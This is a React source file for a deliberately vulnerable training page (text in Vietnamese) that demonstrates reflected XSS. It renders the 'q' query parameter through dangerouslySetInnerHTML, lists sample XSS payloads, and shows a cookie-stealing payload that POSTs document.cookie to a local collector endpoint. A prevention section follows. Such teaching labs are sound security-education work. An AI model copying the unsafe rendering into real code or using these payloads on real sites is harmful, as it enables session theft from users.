import React, { useState } from 'react';
import { Card, Typography, Input, Alert, Divider } from 'antd';
import MainLayout from '../components/Layout/MainLayout';
import { useSearchParams } from 'react-router-dom';

const { Title, Paragraph, Text } = Typography;
const { Search } = Input;

const ReflectedXSSPage = () => {
  const [searchParams, setSearchParams] = useSearchParams();
  const [userInput, setUserInput] = useState('');

  // Cố tình tạo lỗ hổng bằng cách render trực tiếp HTML từ query parameter
  const searchQuery = searchParams.get('q') || '';

  const handleSearch = (value) => {
    setUserInput(value);
    setSearchParams({ q: value });
  };

  return (
    <MainLayout>
      <div className="container mx-auto p-4">
        <Title level={2}>Reflected XSS Attack Demo</Title>
        <Card className="mb-4">
          <Title level={4}>1. Giới thiệu Reflected XSS</Title>
          <Paragraph>
            Reflected XSS (Cross-Site Scripting) là một loại tấn công mà kẻ tấn công có thể chèn mã
            JavaScript độc hại vào trang web thông qua việc gửi payload trong URL hoặc form input.
          </Paragraph>
          <Paragraph>
            Khác với Stored XSS, Reflected XSS không lưu trữ payload trên server mà chỉ phản ánh
            (reflect) payload từ request của người dùng vào response.
          </Paragraph>
        </Card>

        <Card className="mb-4">
          <Title level={4}>2. Demo Reflected XSS</Title>
          <div className="mb-4">
            <Paragraph>
              Trang này chứa lỗ hổng Reflected XSS trong việc xử lý query parameter. Khi bạn nhập
              payload XSS vào ô tìm kiếm, nó sẽ được phản ánh trực tiếp vào trang thông qua{' '}
              <Text code>dangerouslySetInnerHTML</Text>.
            </Paragraph>
            <div className="mb-4">
              <Search
                placeholder="Nhập nội dung tìm kiếm..."
                onSearch={handleSearch}
                enterButton
                style={{ maxWidth: 500 }}
              />
            </div>

            {searchQuery && (
              <div>
                <Title level={4}>Kết quả tìm kiếm cho:</Title>
                {/* Cố tình tạo lỗ hổng XSS bằng cách sử dụng dangerouslySetInnerHTML */}
                <div dangerouslySetInnerHTML={{ __html: searchQuery }} />
              </div>
            )}
          </div>

          <Divider />

          <Title level={4}>3. Cách thực hiện tấn công</Title>
          <Paragraph>
            <Text strong>Cách 1: Sử dụng form tìm kiếm</Text>
            <br />
            Nhập payload XSS vào ô tìm kiếm, ví dụ:
            <br />
            <Text code>{'<script>alert("XSS")</script>'}</Text>
          </Paragraph>

          <Paragraph>
            <Text strong>Cách 2: Truy cập trực tiếp URL</Text>
            <br />
            Truy cập URL với payload XSS trong query parameter, ví dụ:
            <br />
            <Text code>
              {window.location.origin + '/reflected-xss?q=<img src="x" onerror="alert(\'XSS\')">'}
            </Text>
          </Paragraph>

          <Paragraph>
            <Text strong>Cách 3: Đánh cắp cookie</Text>
            <br />
            Sử dụng payload sau để gửi cookie đến server của kẻ tấn công:
            <br />
            <Text code>
              {encodeURIComponent(
                "<img src=\"x\" onerror=\"fetch('http://localhost:5002/steal-cookies', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie, userAgent: navigator.userAgent})})\">"
              )}
            </Text>
          </Paragraph>
        </Card>

        <Card className="mb-4">
          <Title level={4}>4. Các payload XSS mẫu</Title>
          <ul>
            <li>
              <Text code>{'<img src="x" onerror="alert(\'XSS\')">'}</Text> - Sử dụng onerror
            </li>
            <li>
              <Text code>{'<svg onload="alert(\'XSS\')">'}</Text> - Sử dụng SVG
            </li>
            <li>
              <Text code>{'<iframe onload="alert(\'XSS\')">'}</Text> - Sử dụng iframe
            </li>
            <li>
              <Text code>{'<a href="javascript:alert(\'XSS\')">Click me</a>'}</Text> - Sử dụng
              javascript: protocol
            </li>
          </ul>
        </Card>

        <Card>
          <Title level={4}>5. Cách phòng chống</Title>
          <Paragraph>
            <ul>
              <li>
                Không sử dụng <Text code>dangerouslySetInnerHTML</Text> với dữ liệu không đáng tin
                cậy
              </li>
              <li>
                Sử dụng <Text code>textContent</Text> hoặc <Text code>innerText</Text> thay thế
              </li>
              <li>Sanitize dữ liệu trước khi render</li>
              <li>Sử dụng Content Security Policy (CSP)</li>
              <li>Validate và encode dữ liệu đầu vào</li>
              <li>Sử dụng thư viện sanitize như DOMPurify</li>
              <li>Encode các ký tự đặc biệt trong HTML</li>
              <li>Thiết lập header X-XSS-Protection</li>
            </ul>
          </Paragraph>
        </Card>
      </div>
    </MainLayout>
  );
};

export default ReflectedXSSPage;
